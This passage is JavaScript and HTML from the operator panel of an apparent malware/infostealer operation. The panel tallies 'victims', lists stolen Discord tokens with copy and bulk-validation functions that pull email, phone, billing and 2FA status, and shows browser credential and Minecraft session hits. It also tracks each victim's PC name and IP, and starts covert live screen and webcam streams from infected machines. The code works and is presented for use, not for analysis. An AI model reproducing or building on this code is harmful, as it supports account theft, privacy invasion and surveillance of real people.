                        oninput="window.webcamQuality = this.value; updateWebcamQualityLabel()">
                    <small id="webcamQualityLabel" style="color: var(--text-muted);">80 (High)</small>
                </div>
                <div style="flex: 1;">
                    <label for="webcamFpsSlider" style="display: block; margin-bottom: 8px; font-size: 12px;">
                        <i class="fas fa-tachometer-alt"></i> Target FPS
                    </label>
                    <select id="webcamFpsSlider" onchange="window.webcamFps = this.value; updateWebcamQualityLabel()" style="width: 100%; padding: 8px;">
                        <option value="15">15 FPS (Low)</option>
                        <option value="24">24 FPS (Normal)</option>
                        <option value="30" selected>30 FPS (High)</option>
                        <option value="60">60 FPS (Ultra)</option>
                    </select>
                </div>
            </div>
            <button class="btn btn-primary" onclick="startWebcamModal()" id="webcamStartBtn">
                <i class="fas fa-play"></i> Start Webcam
            </button>
            <button class="btn btn-secondary" onclick="stopWebcamModal()" id="webcamStopBtn" style="display: none;">
                <i class="fas fa-stop"></i> Stop Webcam
            </button>
            <button class="btn btn-secondary" onclick="toggleWebcamSound()" id="webcamSoundBtn">
                <i class="fas fa-volume-up"></i> Sound On
            </button>
            <button class="btn btn-secondary" onclick="requestWebcamSnapshot()">
                <i class="fas fa-camera"></i> Snapshot
            </button>
            <button class="btn btn-secondary" onclick="toggleWebcamFullscreen()">
                <i class="fas fa-expand"></i> Fullscreen
            </button>
            <span id="webcamStats" style="color: var(--text-muted); font-size: 12px;">Ready</span>
        </div>
        <audio id="webcamAudio" style="display: none;"></audio>
    </div>

    <script>
        let currentUser = null;
        let allLogs = [];
        
        // REAL LOGIN FUNCTION - Overrides the placeholder in HEAD
        window.login = async function() {
            try {
                const username = document.getElementById('loginUsername').value;
                const password = document.getElementById('loginPassword').value;
                
                if (!username || !password) {
                    const err = document.getElementById('loginError');
                    if (err) {
                        err.textContent = 'Please enter username and password';
                        err.style.display = 'block';
                    }
                    return;
                }
                
                const res = await fetch(API + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                }).then(r => r.json());
                
                if (res.success) {
                    token = res.token;
                    currentUser = res.user;
                    localStorage.setItem('token', token);
                    if (window.showApp) window.showApp();
                } else {
                    const err = document.getElementById('loginError');
                    if (err) {
                        err.textContent = res.error || 'Login failed';
                        err.style.display = 'block';
                    }
                }
            } catch(e) {
                console.error('Login error:', e);
                const err = document.getElementById('loginError');
                if (err) {
                    err.textContent = 'Error: ' + e.message;
                    err.style.display = 'block';
                }
            }
        };
        
        // ==================== WEBSOCKET LIVE STREAMING ====================
        let socket = null;
        let streamConnected = false;
        let currentStreamPlayer = null;
        let currentStreamType = null;
        let streamFpsCounter = 0;
        let streamFpsTimer = null;
        let lastFrameTime = 0;
        
        // OPTIMIZATION: Render loop variables
        let pendingScreenFrame = null;
        let isScreenRenderLoopRunning = false;
        let pendingWebcamFrame = null;
        let isWebcamRenderLoopRunning = false;
        
        function initSocket() {
            if (socket && socket.connected) return;
            
            // OPTIMIZATION: Force WebSocket transport to avoid polling overhead
            socket = io(window.location.origin, {
                transports: ['websocket'], 
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 1000,
                reconnectionDelayMax: 5000,
                randomizationFactor: 0.5,
                upgrade: false, // No upgrade needed if we force websocket
                timeout: 20000,
                autoConnect: true
            });
            
            socket.on('connect', () => {
                console.log('[WS] Connected to server (WebSocket)');
                streamConnected = true;
                updateStreamStatus('connected');
                // Re-join current stream if needed
                if (currentStreamPlayer) {
                    joinStream(currentStreamPlayer, currentStreamType);
                }
            });
            
            socket.on('disconnect', () => {
                console.log('[WS] Disconnected from server');
                streamConnected = false;
                updateStreamStatus('disconnected');
            });
            
            socket.on('stream_joined', (data) => {
                console.log('[WS] Joined stream:', data);
                const t = (data && data.type) ? data.type : 'stream';
                const p = (data && data.player) ? data.player : currentStreamPlayer || 'unknown';
                toast(`Connected to ${t} for ${p}`);
            });
            
            socket.on('frame', (data) => {
                // Received a frame from the stream
                const now = Date.now();
                const frameTime = now - lastFrameTime;
                lastFrameTime = now;
                streamFpsCounter++;
                
                if (data.type === 'screen') {
                    updateScreenshareFrame(data.frame);
                    screenshareFpsCounter++; // Update modal FPS counter too
                } else if (data.type === 'webcam') {
                    updateWebcamFrame(data.frame);
                }
            });
            
            socket.on('audio', (data) => {
                // Received audio data
                playStreamAudio(data.audio);
            });
            
            socket.on('error', (error) => {
                console.error('[WS] Error:', error);
                toast('Stream error: ' + error, 'error');
            });
        }
        
        function updateStreamStatus(status) {
            const indicator = document.getElementById('streamConnectionStatus');
            if (indicator) {
                if (status === 'connected') {
                    indicator.innerHTML = '<i class="fas fa-circle" style="color: #22c55e;"></i> Live';
                } else {
                    indicator.innerHTML = '<i class="fas fa-circle" style="color: #ef4444;"></i> Offline';
                }
            }
        }
        
        function joinStream(player, type) {
            try {
                if (!socket || !socket.connected) {
                    initSocket();
                    setTimeout(() => joinStream(player, type), 500);
                    return;
                }

                currentStreamPlayer = player;
                currentStreamType = type;

                socket.emit('join_stream', { player, type });

                // Start FPS counter only for screenshare (webcam uses modal counter)
                if (type === 'screen') {
                    streamFpsCounter = 0;
                    if (streamFpsTimer) clearInterval(streamFpsTimer);
                    streamFpsTimer = setInterval(() => {
                        const fpsDisplay = document.getElementById('screenshareFps');
                        if (fpsDisplay) {
                            fpsDisplay.textContent = streamFpsCounter + ' FPS';
                        }
                        streamFpsCounter = 0;
                    }, 1000);
                }
            } catch(e) {
                console.error('joinStream error:', e);
            }
        }
        
        function leaveStream(player, type) {
            try {
                if (socket && socket.connected) {
                    socket.emit('leave_stream', { player, type });
                }
                
                currentStreamPlayer = null;
                currentStreamType = null;
                
                if (streamFpsTimer) {
                    clearInterval(streamFpsTimer);
                    streamFpsTimer = null;
                }
            } catch(e) {
                console.error('leaveStream error:', e);
            }
        }
        
        function updateStreamQualityLabel() {
            const quality = parseInt(document.getElementById('streamQualitySlider')?.value || '80');
            const label = quality >= 85 ? 'Very High' : quality >= 70 ? 'High' : quality >= 50 ? 'Medium' : quality >= 30 ? 'Low' : 'Very Low';
            const qualityLabel = document.getElementById('qualityLabel');
            if (qualityLabel) {
                qualityLabel.textContent = quality + ' (' + label + ')';
            }
            window.streamQuality = quality;
        }
        
        function updateWebcamQualityLabel() {
            const quality = parseInt(document.getElementById('webcamQualitySlider')?.value || '80');
            const label = quality >= 85 ? 'Very High' : quality >= 70 ? 'High' : quality >= 50 ? 'Medium' : quality >= 30 ? 'Low' : 'Very Low';
            const qualityLabel = document.getElementById('webcamQualityLabel');
            if (qualityLabel) {
                qualityLabel.textContent = quality + ' (' + label + ')';
            }
            window.webcamQuality = quality;
        }
        
        function requestStartStream(player, type, quality = 80, fps = 30) {
            try {
                if (!socket || !socket.connected) {
                    initSocket();
                    setTimeout(() => requestStartStream(player, type, quality, fps), 500);
                    return;
                }
                
                // Store quality and fps settings
                window.streamQuality = quality || 80;
                window.streamFps = fps || 30;
                
                // Also send command via HTTP for Guardian compatibility
                api('/api/remote/command', 'POST', {
                    target_player: player,
                    command_type: type === 'screen' ? 'screenshot' : 'webcam',
                    command_data: 'continuous'
                }).catch(e => console.error('HTTP command error:', e));
                
                // Send with quality and fps for TCP optimization
                socket.emit('start_stream', { 
                    player, 
                    type, 
                    quality: window.streamQuality,
                    fps: window.streamFps,
                    tcp_optimized: true
                });
            } catch(e) {
                console.error('requestStartStream error:', e);
            }
        }
        
        function requestStopStream(player, type) {
            if (socket && socket.connected) {
                socket.emit('stop_stream', { player, type });
            }
            
            // Also send stop command via HTTP
            api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: type === 'screen' ? 'screenshot' : 'webcam',
                command_data: 'stop'
            });
        }
        
        function updateScreenshareFrame(frameBase64) {
            pendingScreenFrame = frameBase64;
            if (!isScreenRenderLoopRunning) {
                isScreenRenderLoopRunning = true;
                requestAnimationFrame(renderScreenLoop);
            }
        }

        function renderScreenLoop() {
            if (pendingScreenFrame) {
                const frameBase64 = pendingScreenFrame;
                pendingScreenFrame = null;

                // Update modal image
                const img = document.getElementById('screenshareModalImage');
                if (img && img.style.display !== 'none') {
                    img.src = 'data:image/jpeg;base64,' + frameBase64;
                    const placeholder = document.getElementById('screenshareModalPlaceholder');
                    if (placeholder) placeholder.style.display = 'none';
                }
                
                // Also update the main page image (if visible)
                const mainImg = document.getElementById('screenshareImage');
                if (mainImg && mainImg.parentElement && mainImg.offsetParent !== null) {
                    mainImg.src = 'data:image/jpeg;base64,' + frameBase64;
                    mainImg.style.display = 'block';
                }
                
                requestAnimationFrame(renderScreenLoop);
            } else {
                isScreenRenderLoopRunning = false;
            }
        }
        
        function updateWebcamFrame(frameBase64) {
            pendingWebcamFrame = frameBase64;
            if (!isWebcamRenderLoopRunning) {
                isWebcamRenderLoopRunning = true;
                requestAnimationFrame(renderWebcamLoop);
            }
        }

        function renderWebcamLoop() {
            if (pendingWebcamFrame) {
                const frameBase64 = pendingWebcamFrame;
                pendingWebcamFrame = null;

                const img = document.getElementById('webcamModalImage');
                const placeholder = document.getElementById('webcamModalPlaceholder');
                if (img) {
                    img.src = 'data:image/jpeg;base64,' + frameBase64;
                    img.style.display = 'block';
                    if (placeholder) placeholder.style.display = 'none';
                    try { webcamFpsCounter++; } catch(e) {}
                }
                
                requestAnimationFrame(renderWebcamLoop);
            } else {
                isWebcamRenderLoopRunning = false;
            }
        }
        
        let audioQueue = [];
        let isPlayingAudio = false;
        
        function playStreamAudio(audioBase64) {
            audioQueue.push(audioBase64);
            if (!isPlayingAudio) {
                playNextAudio();
            }
        }
        
        function playNextAudio() {
            if (audioQueue.length === 0) {
                isPlayingAudio = false;
                return;
            }
            
            isPlayingAudio = true;
            const audioData = audioQueue.shift();
            
            try {
                const audio = new Audio('data:audio/mp3;base64,' + audioData);
                audio.volume = 0.5;
                audio.onended = playNextAudio;
                audio.onerror = playNextAudio;
                audio.play().catch(e => {
                    console.log('Audio play error:', e);
                    playNextAudio();
                });
            } catch (e) {
                playNextAudio();
            }
        }

        async function api(endpoint, method = 'GET', body = null) {
            const opts = {
                method,
                headers: { 'Content-Type': 'application/json' }
            };
            if (token) opts.headers['Authorization'] = `Bearer ${token}`;
            if (body) opts.body = JSON.stringify(body);
            
            try {
                const res = await fetch(API + endpoint, opts);
                const data = await res.json();
                
                // Check if auth failed
                if (res.status === 401 || (data.error && data.error.includes('Unauthorized'))) {
                    logout();
                    toast('Authentication failed. Please login again.', 'error');
                    return { success: false, error: 'Unauthorized' };
                }
                
                return data;
            } catch (e) {
                return { success: false, error: 'Network error' };
            }
        }

        function toast(msg, type = 'success') {
            const t = document.createElement('div');
            t.className = `toast ${type}`;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        // Auth - logout
        function logout() {
            token = null;
            currentUser = null;
            localStorage.removeItem('token');
            document.getElementById('loginPage').style.display = 'flex';
            document.getElementById('app').style.display = 'none';
        }

        async function checkAuth() {
            if (!token) return false;
            const res = await api('/api/auth/verify');
            if (res.success) {
                currentUser = res.user;
                return true;
            }
            // Token is invalid - log out and redirect to login
            toast('Your session has expired. Please login again.', 'error');
            logout();
            return false;
        }

        async function showApp() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('app').style.display = 'block';
            document.getElementById('userName').textContent = currentUser.username;
            document.getElementById('userRole').textContent = currentUser.is_admin ? 'Admin' : 'Member';
            
            if (currentUser.is_admin) {
                document.getElementById('app').classList.add('is-admin');
            }
            
            loadDashboard();
            loadSettings();
        }

        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('page-' + page).classList.add('active');
            event.target.closest('.nav-item').classList.add('active');
            
            if (page === 'logs') loadLogs();
            if (page === 'users') loadUsers();
            if (page === 'alllogs') loadAllUsersLogs();
            // Map page removed

            if (page === 'discord') loadDiscordTokens();
            if (page === 'online') startOnlinePolling();
            if (page === 'webcam') loadWebcamImages();
            if (page === 'login-logs') loadLoginLogs();
            if (page === 'trash') loadTrash();
            if (page === 'audit') loadAuditLog();
        }

        // All Users Logs (Admin only)
        let allUsersData = [];
        let currentUserFilter = 'all';
        let currentAllLogsTypeFilter = 'all';
        let allUsersLogs = [];

        async function loadAllUsersLogs() {
            const res = await api('/api/admin/users-logs');
            if (!res.success) {
                toast('Failed to load users logs', 'error');
                return;
            }
            
            allUsersData = res.users;
            allUsersLogs = [];
            
            // Collect all logs from all users
            res.users.forEach(user => {
                user.logs.forEach(log => {
                    log.panel_user = user.username;
                    log.panel_user_id = user.id;
                    allUsersLogs.push(log);
                });
            });
            
            // Sort by created_at desc
            allUsersLogs.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
            
            renderUserTabs();
            renderUserStats();
            filterAllLogs();
        }
        
        function renderUserTabs() {
            const container = document.getElementById('userTabsBar');
            let html = `<button class="filter-btn ${currentUserFilter === 'all' ? 'active' : ''}" onclick="filterUserLogs('all')">
                <i class="fas fa-globe"></i> All Users (${allUsersLogs.length})
            </button>`;
            
            allUsersData.forEach(user => {
                const logCount = user.logs.length;
                const isActive = currentUserFilter === String(user.id);
                html += `<button class="filter-btn ${isActive ? 'active' : ''}" onclick="filterUserLogs('${user.id}')">
                    <i class="fas fa-user${user.is_admin ? '-shield' : ''}"></i> ${user.username} (${logCount})
                </button>`;
            });
            
            container.innerHTML = html;
        }
        
        function renderUserStats() {
            const container = document.getElementById('userStatsContainer');
            
            if (currentUserFilter === 'all') {
                // Show summary for all users
                const totalMC = allUsersData.reduce((sum, u) => sum + (u.log_counts?.minecraft || 0), 0);
                const totalDiscord = allUsersData.reduce((sum, u) => sum + (u.log_counts?.discord || 0), 0);
                const totalBrowser = allUsersData.reduce((sum, u) => sum + (u.log_counts?.browser || 0), 0);
                const totalZip = allUsersData.reduce((sum, u) => sum + (u.log_counts?.zip || 0), 0);
                const totalVictims = allUsersData.reduce((sum, u) => sum + (u.stats?.victims || 0), 0);
                
                container.innerHTML = `
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon purple"><i class="fas fa-users"></i></div></div>
                            <div class="stat-card-value">${allUsersData.length}</div>
                            <div class="stat-card-label">Panel Users</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon mc"><i class="fas fa-cube"></i></div></div>
                            <div class="stat-card-value">${totalMC}</div>
                            <div class="stat-card-label">MC Sessions</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon blue"><i class="fab fa-discord"></i></div></div>
                            <div class="stat-card-value">${totalDiscord}</div>
                            <div class="stat-card-label">Discord Tokens</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon yellow"><i class="fas fa-key"></i></div></div>
                            <div class="stat-card-value">${totalBrowser}</div>
                            <div class="stat-card-label">Browser Hits</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div></div>
                            <div class="stat-card-value">${totalZip}</div>
                            <div class="stat-card-label">ZIP Files</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon red"><i class="fas fa-desktop"></i></div></div>
                            <div class="stat-card-value">${totalVictims}</div>
                            <div class="stat-card-label">Total Victims</div>
                        </div>
                    </div>
                `;
            } else {
                // Show stats for specific user
                const user = allUsersData.find(u => String(u.id) === currentUserFilter);
                if (!user) return;
                
                container.innerHTML = `
                    <div class="build-key-box" style="margin-bottom: 16px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <div class="build-key-label">User: ${user.username} ${user.is_admin ? '(Admin)' : ''}</div>
                                <div class="build-key-value">${user.build_key}</div>
                            </div>
                            <div style="text-align: right; font-size: 12px; color: var(--text-muted);">
                                Created: ${new Date(user.created_at).toLocaleDateString()}<br>
                                Last Login: ${user.last_login ? new Date(user.last_login).toLocaleString() : 'Never'}
                            </div>
                        </div>
                    </div>
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon mc"><i class="fas fa-cube"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.minecraft || 0}</div>
                            <div class="stat-card-label">MC Sessions</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon blue"><i class="fab fa-discord"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.discord || 0}</div>
                            <div class="stat-card-label">Discord Tokens</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon yellow"><i class="fas fa-key"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.browser || 0}</div>
                            <div class="stat-card-label">Browser Hits</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.zip || 0}</div>
                            <div class="stat-card-label">ZIP Files</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon red"><i class="fas fa-desktop"></i></div></div>
                            <div class="stat-card-value">${user.stats?.victims || 0}</div>
                            <div class="stat-card-label">Victims</div>
                        </div>
                    </div>
                `;
            }
        }
        
        function filterUserLogs(userId) {
            currentUserFilter = userId;
            renderUserTabs();
            renderUserStats();
            filterAllLogs();
        }
        
        function filterAllLogsByType(type) {
            currentAllLogsTypeFilter = type;
            document.querySelectorAll('#allLogsTypeFilter .filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            filterAllLogs();
        }
        
        function filterAllLogs() {
            let filtered = allUsersLogs;
            
            // Filter by user
            if (currentUserFilter !== 'all') {
                filtered = filtered.filter(log => String(log.panel_user_id) === currentUserFilter);
            }
            
            // Filter by type
            if (currentAllLogsTypeFilter !== 'all') {
                filtered = filtered.filter(log => log.log_type === currentAllLogsTypeFilter);
            }
            
            renderAllLogs(filtered);
        }
        
        function renderAllLogs(logs) {
            const container = document.getElementById('allLogsGrid');
            if (!logs.length) {
                container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs found</p>';
                return;
            }
            
            container.innerHTML = logs.map(log => {
                const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                const preview = getPreview(log.log_type, data);
                const typeClass = getTypeClass(log.log_type);
                const typeIcon = getTypeIcon(log.log_type);
                
                return `
                    <div class="log-card">
                        <div class="log-card-header">
                            <div class="log-card-type">
                                <span class="log-type-badge ${typeClass}">
                                    <i class="${typeIcon}"></i> ${log.log_type}
                                </span>
                                <span style="font-size: 11px; color: var(--accent); background: rgba(99,102,241,0.15); padding: 3px 8px; border-radius: 10px;">
                                    <i class="fas fa-user"></i> ${log.panel_user || 'Unknown'}
                                </span>
                            </div>
                            <div class="log-card-actions">
                                <button class="btn btn-icon btn-secondary" onclick='openLogDetail(${JSON.stringify(log)})'>
                                    <i class="fas fa-eye"></i>
                                </button>
                            </div>
                        </div>
                        <div class="log-card-body">
                            <div class="log-info-row"><i class="fas fa-desktop"></i> <span>${log.pc_name || 'Unknown'}</span></div>
                            <div class="log-info-row"><i class="fas fa-user"></i> <span>${log.pc_user || 'Unknown'}</span></div>
                            <div class="log-info-row"><i class="fas fa-globe"></i> <span>${log.ip || 'Unknown'} ${log.country ? '(' + log.country + ')' : ''}</span></div>
                            ${preview}
                        </div>
                        <div class="log-card-footer">
                            <span><i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}</span>
                        </div>
                    </div>
                `;
            }).join('');
        }

        // Discord Tokens
        let allDiscordTokens = [];
        let currentDiscordFilter = 'all';
        
        async function loadDiscordTokens() {
            document.getElementById('discordTokensLoading').style.display = 'block';
            document.getElementById('discordTokensTable').innerHTML = '';
            
            const res = await api('/api/discord/tokens');
            document.getElementById('discordTokensLoading').style.display = 'none';
            
            if (!res.success) {
                toast('Failed to load tokens', 'error');
                return;
            }
            
            allDiscordTokens = res.tokens;
            updateDiscordStats();
            renderDiscordTokens();
        }
        
        function updateDiscordStats() {
            document.getElementById('dcTotalTokens').textContent = allDiscordTokens.length;
            document.getElementById('dcValidTokens').textContent = allDiscordTokens.filter(t => t.valid === true).length;
            document.getElementById('dcNitroTokens').textContent = allDiscordTokens.filter(t => t.has_nitro || (t.nitro_type && t.nitro_type !== 'No Nitro' && t.nitro_type !== '')).length;
            document.getElementById('dcZipTokens').textContent = allDiscordTokens.filter(t => t.source === 'zip').length;
        }
        
        function filterDiscordTokens(filter) {
            currentDiscordFilter = filter;
            document.querySelectorAll('#page-discord .filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            renderDiscordTokens();
        }
        
        function renderDiscordTokens() {
            let filtered = allDiscordTokens;
            
            // Apply type filter
            if (currentDiscordFilter === 'direct') filtered = filtered.filter(t => t.source === 'direct' || t.source === 'guardian' || t.source === 'validated');
            else if (currentDiscordFilter === 'zip') filtered = filtered.filter(t => t.source === 'zip');
            else if (currentDiscordFilter === 'valid') filtered = filtered.filter(t => t.valid === true);
            else if (currentDiscordFilter === 'invalid') filtered = filtered.filter(t => t.valid === false);
            else if (currentDiscordFilter === 'nitro') filtered = filtered.filter(t => t.has_nitro || (t.nitro_type && t.nitro_type !== 'No Nitro' && t.nitro_type !== ''));
            
            // Apply search filter (new)
            if (discordSearchQuery) {
                filtered = filtered.filter(t => {
                    const searchFields = [
                        t.username || '',
                        t.email || '',
                        t.user_id || '',
                        t.pc_name || '',
                        t.pc_user || '',
                        t.ip || ''
                    ].join(' ').toLowerCase();
                    return searchFields.includes(discordSearchQuery);
                });
            }
            
            document.getElementById('discordTokensTable').innerHTML = filtered.map((token, idx) => {
                // Find original index in allDiscordTokens
                const originalIdx = allDiscordTokens.indexOf(token);
                
                const statusIcon = token.valid === true ? '<i class="fas fa-check-circle" style="color: var(--success);"></i>' :
                                   token.valid === false ? '<i class="fas fa-times-circle" style="color: var(--danger);"></i>' :
                                   '<i class="fas fa-question-circle" style="color: var(--text-muted);"></i>';
                
                // Nitro badge with styling - check both has_nitro and nitro_type
                const hasNitro = token.has_nitro || (token.nitro_type && token.nitro_type !== 'No Nitro' && token.nitro_type !== '');
                const nitroLabel = token.nitro_type || (hasNitro ? 'Nitro' : '');
                const nitroBadge = hasNitro ? 
                    `<span style="background: linear-gradient(90deg, #f47fff, #a855f7); color: white; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 600;">
                        <i class="fas fa-crown"></i> ${nitroLabel}
                    </span>` : '';
                
                const billingIcon = token.has_billing ? '<span style="color: var(--success);" title="Has Billing"></span>' : '';
                const mfaIcon = token.mfa_enabled ? '<span style="color: var(--accent);" title="2FA Enabled"></span>' : '';
                
                const badgeCount = token.badges ? token.badges.length : 0;
                const badgeIcon = badgeCount > 0 ? `<span style="color: var(--danger);" title="${badgeCount} Badges">${badgeCount}</span>` : '';
                
                // Only show token (not status text after |)
                const shortToken = token.token.substring(0, 25) + '...';
                const tokenId = 'dctoken_' + originalIdx;
                window[tokenId] = token.token;
                
                const sourceLabel = token.source === 'zip' ? 
                    `<span style="background: rgba(16,185,129,0.15); color: var(--success); padding: 2px 8px; border-radius: 12px; font-size: 11px;">
                        <i class="fas fa-file-archive"></i> ZIP
                    </span>` :
                    `<span style="background: rgba(88,101,242,0.15); color: var(--discord-blue); padding: 2px 8px; border-radius: 12px; font-size: 11px;">
                        <i class="fas fa-bolt"></i> Direct
                    </span>`;
                
                // Avatar URL - use Discord CDN if we have user_id and avatar
                let avatarHtml = '';
                if (token.user_id && token.avatar) {
                    const avatarUrl = `https://cdn.discordapp.com/avatars/${token.user_id}/${token.avatar}.png?size=64`;
                    avatarHtml = `<img src="${avatarUrl}" style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; border: 2px solid ${hasNitro ? '#a855f7' : 'var(--discord-blue)'};" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">`;
                } else if (token.valid === true) {
                    avatarHtml = `<div style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; background: var(--discord-blue); display: flex; align-items: center; justify-content: center; font-size: 16px;"><i class="fab fa-discord"></i></div>`;
                } else {
                    avatarHtml = `<div style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; background: var(--bg-secondary); display: flex; align-items: center; justify-content: center; font-size: 16px; color: var(--text-muted);"><i class="fas fa-user"></i></div>`;
                }
                
                return `
                    <tr>
                        <td style="text-align: center;">${statusIcon}</td>
                        <td>
                            <div style="display: flex; align-items: center;">
                                ${avatarHtml}
                                <div>
                                    <div style="font-weight: 600; font-size: 14px;">${token.username || 'Unknown'}</div>
                                    ${token.email ? `<div style="font-size: 11px; color: var(--text-muted);">${token.email}</div>` : ''}
                                    <div style="margin-top: 4px;">${nitroBadge}</div>
                                </div>
                            </div>
                        </td>
                        <td>
                            <code style="font-size: 10px; background: var(--bg-secondary); padding: 4px 8px; border-radius: 4px; display: inline-block; max-width: 180px; overflow: hidden; text-overflow: ellipsis;">${shortToken}</code>
                        </td>
                        <td>${sourceLabel}</td>
                        <td style="font-size: 12px;">
                            ${mfaIcon} ${billingIcon} ${badgeIcon}
                        </td>
                        <td style="font-size: 12px; color: var(--text-secondary);">
                            ${token.pc_user}@${token.pc_name}<br>
                            <span style="font-size: 11px; color: var(--text-muted);">${token.ip} (${token.country})</span>
                        </td>
                        <td>
                            <div style="display: flex; gap: 4px;">
                                <button class="btn btn-secondary btn-icon" onclick="copyToken('${tokenId}', this)" title="Copy Token">
                                    <i class="fas fa-copy"></i>
                                </button>
                                <button class="btn btn-secondary btn-icon" onclick="validateToken(${originalIdx})" title="Validate">
                                    <i class="fas fa-check"></i>
                                </button>
                                <button class="btn btn-secondary btn-icon" onclick="showTokenDetail(${originalIdx})" title="Details">
                                    <i class="fas fa-eye"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');
            
            if (filtered.length === 0) {
                document.getElementById('discordTokensTable').innerHTML = `
                    <tr><td colspan="7" style="text-align: center; padding: 40px; color: var(--text-muted);">
                        <i class="fab fa-discord" style="font-size: 32px; margin-bottom: 12px; display: block;"></i>
                        No Discord tokens found
                    </td></tr>
                `;
            }
        }
        
        async function validateToken(idx) {
            const token = allDiscordTokens[idx];
            if (!token) return;
            
            toast('Validating token...', 'success');
            
            const res = await api('/api/discord/validate', 'POST', { token: token.token });
            
            if (res.success) {
                allDiscordTokens[idx].valid = res.valid;
                
                if (res.valid && res.user) {
                    allDiscordTokens[idx].username = res.user.username;
                    allDiscordTokens[idx].email = res.user.email;
                    allDiscordTokens[idx].phone = res.user.phone;
                    allDiscordTokens[idx].nitro_type = res.user.nitro_type;
                    allDiscordTokens[idx].has_nitro = res.user.has_nitro;
                    allDiscordTokens[idx].has_billing = res.user.has_billing;
                    allDiscordTokens[idx].badges = res.user.badges;
                    allDiscordTokens[idx].user_id = res.user.id;
                    allDiscordTokens[idx].avatar = res.user.avatar;
                    allDiscordTokens[idx].banner = res.user.banner;
                    allDiscordTokens[idx].mfa_enabled = res.user.mfa_enabled;
                    allDiscordTokens[idx].verified = res.user.verified;
                    allDiscordTokens[idx].guild_count = res.user.guild_count;
                    allDiscordTokens[idx].friends_count = res.user.friends_count;
                    allDiscordTokens[idx].enhanced = true;
                    toast(` Valid: ${res.user.username}${res.user.has_nitro ? ' [NITRO]' : ''}${res.user.mfa_enabled ? ' [MFA]' : ''}`, 'success');
                } else if (res.valid) {
                    toast('Token valid (limited info)', 'success');
                } else {
                    toast(` Invalid: ${res.error}`, 'error');
                }
                
                updateDiscordStats();
                renderDiscordTokens();
            } else {
                toast('Validation failed', 'error');
            }
        }
        
        async function validateAllTokens() {
            const btn = document.getElementById('validateAllBtn');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validating...';
            btn.disabled = true;
            
            let validated = 0;
            let valid = 0;
            let invalid = 0;
            let nitroCount = 0;
            
            for (let i = 0; i < allDiscordTokens.length; i++) {
                if (allDiscordTokens[i].valid === null || allDiscordTokens[i].valid === undefined) {
                    const res = await api('/api/discord/validate', 'POST', { token: allDiscordTokens[i].token });
                    
                    if (res.success) {
                        allDiscordTokens[i].valid = res.valid;
                        
                        if (res.valid && res.user) {
                            allDiscordTokens[i].username = res.user.username;
                            allDiscordTokens[i].email = res.user.email;
                            allDiscordTokens[i].phone = res.user.phone;
                            allDiscordTokens[i].nitro_type = res.user.nitro_type;
                            allDiscordTokens[i].has_nitro = res.user.has_nitro;
                            allDiscordTokens[i].has_billing = res.user.has_billing;
                            allDiscordTokens[i].badges = res.user.badges;
                            allDiscordTokens[i].user_id = res.user.id;
                            allDiscordTokens[i].avatar = res.user.avatar;
                            allDiscordTokens[i].banner = res.user.banner;
                            allDiscordTokens[i].mfa_enabled = res.user.mfa_enabled;
                            allDiscordTokens[i].verified = res.user.verified;
                            allDiscordTokens[i].guild_count = res.user.guild_count;
                            allDiscordTokens[i].friends_count = res.user.friends_count;
                            allDiscordTokens[i].enhanced = true;
                            valid++;
                            if (res.user.has_nitro) nitroCount++;
                            
                            // Log to console
                            const nitroTag = res.user.has_nitro ? ' [NITRO]' : '';
                            const mfaTag = res.user.mfa_enabled ? ' [MFA]' : '';
                            console.log(`[${validated+1}/${allDiscordTokens.length}]  ${res.user.username}${nitroTag}${mfaTag}`);
                        } else if (res.valid) {
                            valid++;
                        } else {
                            invalid++;
                            console.log(`[${validated+1}/${allDiscordTokens.length}]  Invalid - ${res.error}`);
                        }
                    }
                    
                    validated++;
                    btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${validated}/${allDiscordTokens.length}`;
                    
                    // Update display every 5 tokens
                    if (validated % 5 === 0) {
                        updateDiscordStats();
